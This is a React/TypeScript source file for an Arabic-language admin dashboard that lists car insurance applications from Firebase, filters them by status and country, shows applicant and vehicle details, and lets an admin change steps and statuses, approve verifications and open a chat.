"use client"

import type React from "react"
import { useState, useEffect, useMemo, useCallback, useRef } from "react"
import {
  Search,
  MessageSquare,
  Settings,
  CreditCard,
  FileText,
  Shield,
  User,
  ChevronDown,
  Info,
  Globe,
  Copy,
  Check,
  MapPin,
  Car,
} from "lucide-react"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { Input } from "@/components/ui/input"
import { subscribeToApplications, updateApplication } from "@/lib/firebase-services"
import { ChatPanel } from "@/components/chat-panel"
import { InsuranceApplication } from "@/lib/firestore-types"

const STEP_NAMES: Record<number | string, string> = {
  1: "المعلومات الأساسية",
  2: "تفاصيل التأمين",
  3: "اختيار العرض",
  4: "الدفع",
}

const COUNTRIES = ["السعودية", "الإمارات", "الكويت", "البحرين", "قطر", "عمان", "مصر", "الأردن"]

export default function AdminDashboard() {
  const [applications, setApplications] = useState<InsuranceApplication[]>([])
  const [filteredApplications, setFilteredApplications] = useState<InsuranceApplication[]>([])
  const [selectedApplication, setSelectedApplication] = useState<InsuranceApplication | null>(null)
  const [searchQuery, setSearchQuery] = useState("")
  const [countryFilter, setCountryFilter] = useState<string>("all")
  const [statusFilter, setStatusFilter] = useState<string>("all")
  const [loading, setLoading] = useState(true)
  const [showChat, setShowChat] = useState(false)
  const [copiedField, setCopiedField] = useState<string | null>(null)
  const [showCountryMenu, setShowCountryMenu] = useState(false)
  const prevApplicationsCount = useRef<number>(0)

  const stats = useMemo(
    () => ({
      total: applications.length,
      completed: applications.filter((a) => a.status === "completed").length,
      pending: applications.filter((a) => a.status === "pending_review").length,
      approved: applications.filter((a) => a.status === "approved").length,
      draft: applications.filter((a) => a.status === "draft").length,
    }),
    [applications],
  )

  useEffect(() => {
    setLoading(true)
    const unsubscribe = subscribeToApplications((apps) => {
      prevApplicationsCount.current = apps.length
      setApplications(apps)
      setLoading(false)
    })
    return () => unsubscribe()
  }, [])

  useEffect(() => {
    const timer = setTimeout(() => {
      let filtered = applications

      if (statusFilter !== "all") {
        filtered = filtered.filter((a) => a.status === statusFilter)
      }

      if (countryFilter !== "all") {
        filtered = filtered.filter((a) => a.country === countryFilter)
      }

      if (searchQuery) {
        const query = searchQuery.toLowerCase()
        filtered = filtered.filter(
          (app) =>
            app.ownerName?.toLowerCase().includes(query) ||
            app.identityNumber?.includes(query) ||
            app.phoneNumber?.includes(query) ||
            app.vehicleModel?.toLowerCase().includes(query),
        )
      }

      filtered = filtered.sort((a, b) => {
        const dateA = a.updatedAt ? new Date(a.updatedAt).getTime() : 0
        const dateB = b.updatedAt ? new Date(b.updatedAt).getTime() : 0
        return dateB - dateA
      })

      setFilteredApplications(filtered)
    }, 200)

    return () => clearTimeout(timer)
  }, [applications, searchQuery, statusFilter, countryFilter])

  useEffect(() => {
    if (selectedApplication) {
      const updated = applications.find((app) => app.id === selectedApplication.id)
      if (updated) setSelectedApplication(updated)
    }
  }, [applications, selectedApplication])

  const formatTime = useCallback((dateObj?: Date | string) => {
    if (!dateObj) return ""
    const date = typeof dateObj === "string" ? new Date(dateObj) : dateObj
    const now = new Date()
    const diff = Math.floor((now.getTime() - date.getTime()) / 1000)
    if (diff < 60) return "الآن"
    if (diff < 3600) return `${Math.floor(diff / 60)}د`
    if (diff < 86400) return `${Math.floor(diff / 3600)}س`
    return `${Math.floor(diff / 86400)}ي`
  }, [])

  const copyToClipboard = async (text: string, fieldId: string) => {
    await navigator.clipboard.writeText(text)
    setCopiedField(fieldId)
    setTimeout(() => setCopiedField(null), 2000)
  }

  const handleStepChange = async (appId: string, step: number) => {
    try {
      await updateApplication(appId, { currentStep: step })
    } catch (error) {
      console.error("Error updating step:", error)
    }
  }

  const handleStatusChange = async (appId: string, status: InsuranceApplication["status"]) => {
    try {
      await updateApplication(appId, { status })
    } catch (error) {
      console.error("Error updating status:", error)
    }
  }

  const selectApp = (app: InsuranceApplication) => {
    setSelectedApplication(app)
    setShowChat(false)
  }

  const getStatusColor = (status: string) => {
    switch (status) {
      case "completed":
        return "bg-emerald-500/20 text-emerald-400"
      case "approved":
        return "bg-blue-500/20 text-blue-400"
      case "pending_review":
        return "bg-amber-500/20 text-amber-400"
      case "rejected":
        return "bg-red-500/20 text-red-400"
      default:
        return "bg-slate-500/20 text-slate-400"
    }
  }

  return (
    <div className="h-screen bg-slate-950 text-[11px] flex flex-col" dir="rtl">
      <header className="bg-slate-900 border-b border-slate-800 px-3 py-1.5 flex items-center justify-between flex-shrink-0">
        <div className="flex items-center gap-2">
          <div className="w-6 h-6 rounded bg-emerald-500 flex items-center justify-center">
            <Shield className="w-3 h-3 text-white" />
          </div>
          <span className="text-xs font-bold text-white">لوحة التحكم - التأمين</span>
        </div>

        <div className="flex items-center gap-3 text-[10px]">
          <span className="text-slate-400">
            الإجمالي: <span className="text-white font-bold">{stats.total}</span>
          </span>
          <span className="text-slate-400">
            مكتمل: <span className="text-emerald-400 font-bold">{stats.completed}</span>
          </span>
          <span className="text-slate-400">
            قيد المراجعة: <span className="text-amber-400 font-bold">{stats.pending}</span>
          </span>
          <span className="text-slate-400">
            موافق عليه: <span className="text-blue-400 font-bold">{stats.approved}</span>
          </span>
        </div>

        <div className="flex items-center gap-1 relative">
          <Button
            onClick={() => setShowCountryMenu(!showCountryMenu)}
            variant="ghost"
            size="sm"
            className="h-6 px-2 text-[10px] text-slate-400 hover:text-white gap-1"
          >
            <Globe className="w-3 h-3" />
            {countryFilter === "all" ? "كل الدول" : countryFilter}
            <ChevronDown className="w-2.5 h-2.5" />
          </Button>
          {showCountryMenu && (
            <div className="absolute top-full right-0 mt-1 bg-slate-800 border border-slate-700 rounded shadow-lg z-50">
              <button
                onClick={() => {
                  setCountryFilter("all")
                  setShowCountryMenu(false)
                }}
                className="block w-full text-left px-3 py-1.5 text-[10px] text-slate-300 hover:bg-slate-700"
              >
                كل الدول
              </button>
              {COUNTRIES.map((c) => (
                <button
                  key={c}
                  onClick={() => {
                    setCountryFilter(c)
                    setShowCountryMenu(false)
                  }}
                  className="block w-full text-left px-3 py-1.5 text-[10px] text-slate-300 hover:bg-slate-700"
                >
                  {c}
                </button>
              ))}
            </div>
          )}
        </div>
      </header>

      <div className="flex flex-1 min-h-0">
        <div className="w-[280px] bg-slate-900/50 border-l border-slate-800 flex flex-col">
          <div className="p-1.5 border-b border-slate-800">
            <div className="flex items-center gap-1 mb-1">
              <div className="relative flex-1">
                <Search className="absolute right-1.5 top-1/2 -translate-y-1/2 w-3 h-3 text-slate-500" />
                <Input
                  placeholder="بحث..."
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  className="pr-6 h-6 text-[10px] bg-slate-800 border-slate-700 text-slate-200 rounded"
                />
              </div>
            </div>
            <div className="flex gap-1 h-5">
              {[
                { value: "all", label: "الكل" },
                { value: "draft", label: "مسودة" },
                { value: "pending_review", label: "قيد الفحص" },
                { value: "completed", label: "مكتمل" },
              ].map((tab) => (
                <button
                  key={tab.value}
                  onClick={() => setStatusFilter(tab.value)}
                  className={`flex-1 h-5 text-[9px] rounded-sm transition-colors ${
                    statusFilter === tab.value
                      ? tab.value === "all"
                        ? "bg-emerald-500 text-white"
                        : tab.value === "draft"
                          ? "bg-blue-500 text-white"
                          : tab.value === "pending_review"
                            ? "bg-amber-500 text-white"
                            : "bg-emerald-500 text-white"
                      : "bg-slate-800 text-slate-400 hover:text-slate-200"
                  }`}
                >
                  {tab.label}
                </button>
              ))}
            </div>
          </div>

          <div className="flex-1 overflow-y-auto">
            {loading ? (
              <div className="flex items-center justify-center h-32">
                <div className="w-5 h-5 border-2 border-emerald-500 border-t-transparent rounded-full animate-spin" />
              </div>
            ) : filteredApplications.length === 0 ? (
              <div className="text-center text-slate-500 py-8 text-[10px]">لا توجد نتائج</div>
            ) : (
              filteredApplications.map((app) => {
                const isActive = selectedApplication?.id === app.id
                const statusColor = getStatusColor(app.status)
                return (
                  <div
                    key={app.id}
                    onClick={() => selectApp(app)}
                    className={`px-2 py-1.5 cursor-pointer border-b border-slate-800/50 transition-all
                      ${isActive ? "bg-emerald-500/10 border-r-2 border-r-emerald-500" : "hover:bg-slate-800/30"}`}
                  >
                    <div className="flex items-center justify-between mb-0.5">
                      <div className="flex items-center gap-1.5 min-w-0">
                        <Badge className={`text-[8px] flex-shrink-0 ${statusColor}`}>{app.status}</Badge>
                        <span
                          className={`font-medium truncate text-[10px] ${isActive ? "text-emerald-300" : "text-slate-200"}`}
                        >
                          {app.ownerName || "متقدم"}
                        </span>
                      </div>
                      <span className="text-[9px] text-slate-500 flex-shrink-0">{formatTime(app.createdAt)}</span>
                    </div>
                    <div className="flex items-center gap-1 text-[9px] text-slate-500">
                      {app.vehicleModel && <span className="text-blue-400">{app.vehicleModel}</span>}
                      {app.country && (
                        <span className="mr-auto flex items-center gap-0.5">
                          <MapPin className="w-2.5 h-2.5" />
                          {app.country}
                        </span>
                      )}
                    </div>
                  </div>
                )
              })
            )}
          </div>
        </div>

        <div className="flex-1 bg-slate-950 flex flex-col">
          {selectedApplication ? (
            showChat ? (
              <ChatPanel
                applicationId={selectedApplication.id!}
                currentUserId="admin-001"
                currentUserName="المسؤول"
                currentUserRole="admin"
                onClose={() => setShowChat(false)}
              />
            ) : (
              <>
                <div className="bg-slate-900 border-b border-slate-800 px-3 py-2 flex items-center justify-between flex-shrink-0">
                  <div className="flex items-center gap-2">
                    <div className="w-8 h-8 rounded-full bg-emerald-500 flex items-center justify-center text-sm font-bold text-white">
                      {selectedApplication.ownerName?.charAt(0) || "ع"}
                    </div>
                    <div>
                      <div className="font-bold text-white text-xs">{selectedApplication.ownerName || "متقدم"}</div>
                      <div className="text-[9px] text-slate-400 flex items-center gap-2">
                        <span>{selectedApplication.phoneNumber}</span>
                        {selectedApplication.country && <span>• {selectedApplication.country}</span>}
                      </div>
                    </div>
                  </div>
                  <div className="flex items-center gap-1">
                    {[1, 2, 3, 4].map((step) => (
                      <Button
                        key={step}
                        onClick={() => handleStepChange(selectedApplication.id!, step)}
                        size="sm"
                        className={`h-5 text-[8px] px-1.5 rounded ${
                          selectedApplication.currentStep === step
                            ? "bg-emerald-500 text-white"
                            : "bg-slate-800 text-slate-400 hover:text-white"
                        }`}
                      >
                        {STEP_NAMES[step]}
                      </Button>
                    ))}
                    <Button
                      onClick={() => setShowChat(true)}
                      size="sm"
                      className="h-6 px-2 bg-blue-500 hover:bg-blue-600 text-white text-[10px] gap-1 mr-2"
                    >
                      <MessageSquare className="w-3 h-3" />
                    </Button>
                  </div>
                </div>

                <div className="flex-1 overflow-y-auto p-3 space-y-3">
                  <Section title="المعلومات الأساسية" icon={<User className="w-4 h-4" />}>
                    <DataRow
                      label="الاسم"
                      value={selectedApplication.ownerName}
                      onCopy={copyToClipboard}
                      copied={copiedField}
                    />
                    <DataRow
                      label="رقم الهوية"
                      value={selectedApplication.identityNumber}
                      onCopy={copyToClipboard}
                      copied={copiedField}
                    />
                    <DataRow
                      label="الهاتف"
                      value={selectedApplication.phoneNumber}
                      onCopy={copyToClipboard}
                      copied={copiedField}
                    />
                    <DataRow
                      label="البلد"
                      value={selectedApplication.country}
                      onCopy={copyToClipboard}
                      copied={copiedField}
                    />
                  </Section>

                  <Section title="معلومات المركبة" icon={<Car className="w-4 h-4" />}>
                    <DataRow
                      label="الموديل"
                      value={selectedApplication.vehicleModel}
                      onCopy={copyToClipboard}
                      copied={copiedField}
                    />
                    <DataRow
                      label="سنة الصنع"
                      value={selectedApplication.manufacturingYear?.toString()}
                      onCopy={copyToClipboard}
                      copied={copiedField}
                    />
                    <DataRow
                      label="القيمة"
                      value={selectedApplication.vehicleValue ? `${selectedApplication.vehicleValue} ر.س` : undefined}
                      onCopy={copyToClipboard}
                      copied={copiedField}
                    />
                  </Section>

                  <Section title="تفاصيل التأمين" icon={<Shield className="w-4 h-4" />}>
                    <DataRow
                      label="نوع التأمين"
                      value={selectedApplication.insuranceType}
                      onCopy={copyToClipboard}
                      copied={copiedField}
                    />
                    <DataRow
                      label="نوع التغطية"
                      value={selectedApplication.coverageType}
                      onCopy={copyToClipboard}
                      copied={copiedField}
                    />
                  </Section>

                  {selectedApplication.selectedOffer && (
                    <Section title="العرض المختار" icon={<FileText className="w-4 h-4" />}>
                      <DataRow
                        label="شركة التأمين"
                        value={selectedApplication.selectedOffer.company}
                        onCopy={copyToClipboard}
                        copied={copiedField}
                      />
                      <DataRow
                        label="السعر"
                        value={`${selectedApplication.selectedOffer.price} ر.س`}
                        onCopy={copyToClipboard}
                        copied={copiedField}
                      />
                    </Section>
                  )}

                  <Section title="حالات الموافقة" icon={<Shield className="w-4 h-4" />}>
                    <ApprovalSection
                      title="تحقق الهاتف"
                      status={selectedApplication.phoneVerificationStatus}
                      onApprove={() =>
                        updateApplication(selectedApplication.id!, {
                          phoneVerificationStatus: "approved",
                        })
                      }
                      onReject={() =>
                        updateApplication(selectedApplication.id!, {
                          phoneVerificationStatus: "rejected",
                        })
                      }
                    />
                    <ApprovalSection
                      title="تحقق الهوية"
                      status={selectedApplication.idVerificationStatus}
                      onApprove={() =>
                        updateApplication(selectedApplication.id!, {
                          idVerificationStatus: "approved",
                        })
                      }
                      onReject={() =>
                        updateApplication(selectedApplication.id!, {
                          idVerificationStatus: "rejected",
                        })
                      }
                    />
                  </Section>

                  <Section title="الإجراءات" icon={<Settings className="w-4 h-4" />}>
                    <div className="flex gap-1 flex-wrap">
                      {["draft", "pending_review", "approved", "rejected", "completed"].map((status) => (
                        <Button
                          key={status}
                          onClick={() =>
                            handleStatusChange(selectedApplication.id!, status as InsuranceApplication["status"])
                          }
                          size="sm"
                          className={`h-6 text-[9px] px-2 rounded ${
                            selectedApplication.status === status
                              ? "bg-emerald-500 text-white"
                              : "bg-slate-800 text-slate-400 hover:text-white"
                          }`}
                        >
                          {status === "pending_review"
                            ? "قيد المراجعة"
                            : status === "draft"
                              ? "مسودة"
                              : status === "approved"
                                ? "موافق"
                                : status === "rejected"
                                  ? "مرفوض"
                                  : "مكتمل"}
                        </Button>
                      ))}
                    </div>
                  </Section>
                </div>
              </>
            )
          ) : (
            <div className="flex-1 flex items-center justify-center">
              <div className="text-center text-slate-500">
                <MessageSquare className="w-12 h-12 mx-auto mb-3 text-slate-700" />
                <p className="text-sm">اختر تطبيق</p>
                <p className="text-[10px]">اضغط على أي تطبيق من القائمة</p>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  )
}

function Section({ title, icon, children }: { title: string; icon: React.ReactNode; children: React.ReactNode }) {
  return (
    <div className="bg-slate-800/30 rounded-lg border border-slate-700/50 p-3">
      <div className="flex items-center gap-2 mb-2">
        <div className="text-slate-400">{icon}</div>
        <h3 className="text-[10px] font-bold text-slate-200">{title}</h3>
      </div>
      <div className="space-y-1">{children}</div>
    </div>
  )
}

function ApprovalSection({
  title,
  status,
  onApprove,
  onReject,
}: {
  title: string
  status?: string
  onApprove: () => void
  onReject: () => void
}) {
  const statusColor =
    !status || status === "pending"
      ? "bg-amber-500/20 text-amber-400"
      : status === "approved"
        ? "bg-emerald-500/20 text-emerald-400"
        : "bg-red-500/20 text-red-400"

  return (
    <div className="flex items-center justify-between p-2 bg-slate-900/50 rounded">
      <span className="text-[9px] text-slate-400">{title}</span>
      <div className="flex items-center gap-1">
        <Badge className={`text-[8px] ${statusColor}`}>
          {status === "approved" ? "موافق" : status === "rejected" ? "مرفوض" : "في الانتظار"}
        </Badge>
        {(!status || status === "pending") && (
          <div className="flex gap-0.5 ml-2">
            <Button
              onClick={onApprove}
              size="sm"
              className="h-4 text-[7px] px-1.5 bg-emerald-500/20 text-emerald-400 hover:bg-emerald-500/30"
            >
              ✓
            </Button>
            <Button
              onClick={onReject}
              size="sm"
              className="h-4 text-[7px] px-1.5 bg-red-500/20 text-red-400 hover:bg-red-500/30"
            >
              ✕
            </Button>
          </div>
        )}
      </div>
    </div>
  )
}

function DataRow({
  label,
  value,
  onCopy,
  copied,
}: {
  label: string
  value?: string | number | null
  onCopy: (v: string, id: string) => void
  copied: string | null
}) {
  if (!value) return null
  const id = `${label}-${value}`
  return (
    <div className="flex items-center justify-between bg-slate-900/50 rounded px-2 py-1">
      <span className="text-[9px] text-slate-500">{label}</span>
      <div className="flex items-center gap-1">
        <span className="text-[10px] text-white" dir="ltr">
          {value}
        </span>
        <button onClick={() => onCopy(String(value), id)} className="text-slate-500 hover:text-white p-0.5">
          {copied === id ? <Check className="w-2.5 h-2.5 text-emerald-400" /> : <Copy className="w-2.5 h-2.5" />}
        </button>
      </div>
    </div>
  )
}
